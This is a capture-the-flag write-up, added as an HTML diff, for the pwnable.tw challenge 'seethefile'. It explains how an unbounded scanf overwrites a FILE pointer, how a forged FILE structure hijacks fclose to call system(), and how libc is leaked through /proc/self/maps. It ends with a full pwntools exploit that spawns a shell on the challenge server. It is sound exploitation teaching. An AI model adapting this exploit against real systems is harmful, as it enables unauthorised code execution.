@@ -1,0 +1,103 @@
+<!--Solve date: 07/06/2022-->
+
+<h1>pwnable.tw - seethefile</h1>
+
+<h2>250 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Initial Analysis</h5>
+
+<p>In this challenge, we are given a binary that can open, read, and then print the contents of files that do not have <code>flag</code> in the filename or <code>flag</code> as contents. The description hints that our goal is not to seek a bypass to these restrictions but rather to spawn a shell. To this end, we can first see whether this is an exploitable stack overflow; however, since the program is everywhere terminated by <code>exit()</code> calls rather than <code>return</code>, even the stack buffer overflow in the <code>scanf("%s");</code> in <code>main()</code> cannot be exploited for control flow hijacking.</p>
+
+<h5>Hooking Function Pointer in <code>fclose()</code> with FSOP</h5>
+
+<p>However, the unsafe call to <code>scanf("%s");</code> (without length specification) identifies another potential overflow location, which is found at the end of <code>main()</code> when the application asks for a name. This buffer within the bss section lies before <code>fp</code>, which holds a pointer to the <code>FILE</code> structure holding the active file being read. This is significant because after the name is read, the application checks to see whether <code>fp</code> is closed; if it is not, it calls <code>fclose()</code> on it before terminating. Such a bug is already well-documented in the whitepaper <code>Play with FILE Structure: Yet Another Binary Exploitation Technique</code> on file stream (or, perhaps more aptly, file structure) oriented programming (FSOP) [1]; by forging a file structure and overwriting its vtable function pointers, it is possible to redirect code execution. A nearly identical example can be found in Section 3.1 of the reference [1].</p>
+
+<p>Specifically, <code>fclose()</code> unlinks the FILE from the linked list of open file pointers, flushes its stream buffer, closes the file descriptor, and frees the FILE structure (as long as it is not a standard stream). To see whether code redirection is possible, we can fill the <code>name</code> buffer with recognizable characters and overwrite <code>fp</code> with the address of <code>name</code>, which is <code>0x0804b260</code>.</p>
+
+<img class = "small" src = "./images/pwnable_seethefile_1.png"/>
+
+<p>We quickly find that this results in segfault within <code>fclose()</code>, as there is an access to a structure at <code>FILE + 0x48</code>. This is likely the <code>_IO_acquire_lock</code> reported in [1]. No problem - we can simply write the address of a writable area in memory there. With this fixed, running again we get a segmentation fault on a call.</p>
+
+<img class = "small" src = "./images/pwnable_seethefile_2.png"/>
+
+<p>The call is to <code>dword ptr [eax + 8]</code>, where <code>eax</code> is pointing to <code>FILE + 0x4c</code>. Let's simply point <code>FILE + 0x4c</code> to itself, then write the target address to <code>8</code> bytes above it. With a test target address of <code>0xdeadbeef</code>, we can see that this works smoothly:</p>
+
+<img class = "small" src = "./images/pwnable_seethefile_3.png"/>
+
+<p>Furthermore, the first argument to the call is simply <code>FILE* fp</code>. This means we have control over one pointer argument. Going after <code>system()</code> for example, we can simply write <code>"AAAA;/bin/sh;#"</code> to the first 8 bytes of <code>FILE</code>. (We keep the <code>AAAA</code> because otherwise a <i>different</i> path within <code>fclose()</code> is taken. This is because the first dword of the <code>FILE</code> structure contains certain flags describing the disposition of the file.) The shell would try to execute <code>AAAA;</code> (which should fail), then <code>/bin/sh;</code> to spawn the shell. The trailing <code>#</code> ignores the rest of the line as a comment.</p>
+
+<h5>Leaking LIBC via <code>/proc</code> Filesystem</h5>
+
+<p>The issue remains about <i>where</i> <code>system()</code> is. This requires a leak. While seemingly impossible at first, we note that we can read any file on the filesystem (with the exception of the flag file, of course). This is helpful because <code>/proc/self/maps</code> <a href = "https://www.kernel.org/doc/html/latest/filesystems/proc.html" target = "_blank">contains the ASLR-resolved addresses of the memory space</a>. The text address is not so important here due to the lack of PIE, but the libc base can be directly obtained via this file. We can easily test this. On the second read, the heap page and libc addresses are revealed, as below:</p>
+
+<img class = "small" src = "./images/pwnable_seethefile_4.png"/>
+
+<p>It turns out that once the shell is obtained, there is another layer of reading to get the flag, which is only readable by root. This is perhaps for added protection to prevent unintended solutions.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+#p = process("./seethefile")
+'''
+gdb.attach(p, gdbscript = """
+
+""")
+'''
+p = remote("chall.pwnable.tw", 10200)
+libc = ELF("./seethefile_libc.so")
+
+rec = lambda: p.recv()
+recl = lambda: p.recvline()
+recu = lambda x: p.recvuntil(x)
+send = lambda x: p.send(x)
+sendl = lambda x: p.sendline(x)
+sendnuml = lambda x: p.sendline(bytes(str(x), "utf-8"))
+inter = lambda: p.interactive()
+
+def menu(choice):
+    recu(b':')
+    sendnuml(choice)
+    return
+
+menu(1)
+rec()
+sendl(b"/proc/self/maps")
+menu(2)
+menu(2)
+menu(3)
+recl()
+#recl()												#on remote, just flush one line
+libc.address = int(recu(b'-')[: -1], 16)
+log.info("Libc: 0x%x" % (libc.address))
+
+name = 0x0804b260
+writable = 0x0804b800
+menu(5)
+rec()
+sendl(
+    (b"AAAA;/bin/sh;#").ljust(32, b'A') + 
+    (p32(name)).ljust(40, b'B') + 
+    p32(writable) + 
+    p32(name + 0x4c) + 								#the address of itself
+    p32(0xcafebabe) + p32(libc.sym["system"])		#call this
+    )
+
+inter()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>1ca6317bd3878cb983021299b770e2d6aaffd39f646f8d29e4b24e587b39e79e</code></p>
+
+<h4>References</h4>
+
+<ol>
+    <li><p>Yang, A.-J. <a href = "https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf" target = "_blank">"Play with FILE Structure: Yet Another Binary Exploitation Technique"</a> <b>2018</b>.</p></li>
+</ol>
